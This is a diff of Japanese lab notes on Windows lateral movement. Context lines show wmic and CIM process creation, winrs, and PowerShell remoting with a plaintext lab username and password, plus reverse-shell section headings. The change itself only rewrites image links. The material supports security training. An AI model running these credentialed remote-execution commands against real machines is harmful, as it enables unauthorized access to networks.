@@ -17,7 +17,7 @@ wmic /node:192.168.184.73 /user:jen /password:Nexus123! process call create "cal
 - /node:
 - /user:
 - /password:
-![](../../../assets/images/Pasted%20image%2020260502092740.png)
+![[Pasted image 20260502092740.png]]
 
 
 WMI ジョブは、新しく作成されたプロセスの PID と、プロセスが正常に作成されたことを意味する戻り値「0」を返しました。
@@ -40,7 +40,7 @@ $command = 'calc';
 ```powershell
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
-![](../../../assets/images/Pasted%20image%2020260502092749.png)
+![[Pasted image 20260502092749.png]]
 
 ## ReverseShell Processの作成
 コマンドの部分を作成するスクリプト
@@ -124,7 +124,7 @@ winrs -r:HOSTNAME -u:DOMAIN\user -p:password "hostname && whoami"
 ```cmd
 winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
 ```
-![](../../../assets/images/Pasted%20image%2020260502092808.png)
+![[Pasted image 20260502092808.png]]
 
 ### リバースシェル
 ```cmd
@@ -164,7 +164,7 @@ corp\jen
 [192.168.184.73]: PS C:\Users\jen\Documents> hostname
 FILES04
 ```
-![](../../../assets/images/Pasted%20image%2020260502092819.png)
+![[Pasted image 20260502092819.png]]
 
 #### WebSvへの横展開
 ```powershell
@@ -178,4 +178,4 @@ New-PSSession -ComputerName 192.168.184.72 -Credential $credential
 ```powershell
 Enter-PSSession 2
 ```
-![](../../../assets/images/Pasted%20image%2020260502092825.png)
+![[Pasted image 20260502092825.png]]
